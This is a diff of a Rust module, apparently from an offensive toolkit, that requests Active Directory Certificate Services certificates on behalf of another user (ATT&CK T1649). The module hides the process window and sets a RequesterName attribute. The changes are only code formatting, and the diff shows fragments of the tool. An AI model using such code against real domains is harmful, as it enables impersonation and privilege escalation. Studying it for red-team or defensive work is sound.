@@ -26,8 +26,8 @@ use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 use windows_sys::Win32::Storage::FileSystem::ReadFile;
 use windows_sys::Win32::System::Pipes::CreatePipe;
 use windows_sys::Win32::System::Threading::{
-    CreateProcessA, WaitForSingleObject, PROCESS_INFORMATION, STARTUPINFOA, CREATE_NO_WINDOW,
-    STARTF_USESTDHANDLES,
+    CREATE_NO_WINDOW, CreateProcessA, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
+    WaitForSingleObject,
 };
 
 fn run_command(cmd: &str) {
@@ -73,7 +73,13 @@ fn run_command(cmd: &str) {
             let mut buf = [0u8; 4096];
             loop {
                 let mut read: u32 = 0;
-                if ReadFile(h_read, buf.as_mut_ptr(), 4096, &mut read, core::ptr::null_mut()) == 0
+                if ReadFile(
+                    h_read,
+                    buf.as_mut_ptr(),
+                    4096,
+                    &mut read,
+                    core::ptr::null_mut(),
+                ) == 0
                     || read == 0
                 {
                     break;
@@ -103,15 +109,45 @@ fn main(args: *mut u8, len: usize) {
 
     println!("=== ADCS Certificate Request On Behalf (T1649) ===");
     println!();
-    println!("  CA Config:    {}", if ca_config.is_empty() { "(empty)" } else { &ca_config });
-    println!("  Template:     {}", if template.is_empty() { "(empty)" } else { &template });
-    println!("  On behalf of: {}", if on_behalf_of.is_empty() { "(empty)" } else { &on_behalf_of });
-    println!("  Request file: {}", if request_file.is_empty() { "(empty)" } else { &request_file });
+    println!(
+        "  CA Config:    {}",
+        if ca_config.is_empty() {
+            "(empty)"
+        } else {
+            &ca_config
+        }
+    );
+    println!(
+        "  Template:     {}",
+        if template.is_empty() {
+            "(empty)"
+        } else {
+            &template
+        }
+    );
+    println!(
+        "  On behalf of: {}",
+        if on_behalf_of.is_empty() {
+            "(empty)"
+        } else {
+            &on_behalf_of
+        }
+    );
+    println!(
+        "  Request file: {}",
+        if request_file.is_empty() {
+            "(empty)"
+        } else {
+            &request_file
+        }
+    );
     println!();
 
     if ca_config.is_empty() || template.is_empty() {
         eprintln!("Error: CA config and template name are required.");
-        eprintln!("Usage: adcs_request_on_behalf <ca_config> <template> [on_behalf_of] [request_file]");
+        eprintln!(
+            "Usage: adcs_request_on_behalf <ca_config> <template> [on_behalf_of] [request_file]"
+        );
         return;
     }
 
@@ -121,10 +157,7 @@ fn main(args: *mut u8, len: usize) {
     );
 
     if !on_behalf_of.is_empty() {
-        cmd = format!(
-            "{} -attrib \"RequesterName:{}\"",
-            cmd, on_behalf_of
-        );
+        cmd = format!("{} -attrib \"RequesterName:{}\"", cmd, on_behalf_of);
     }
 
     if !request_file.is_empty() {
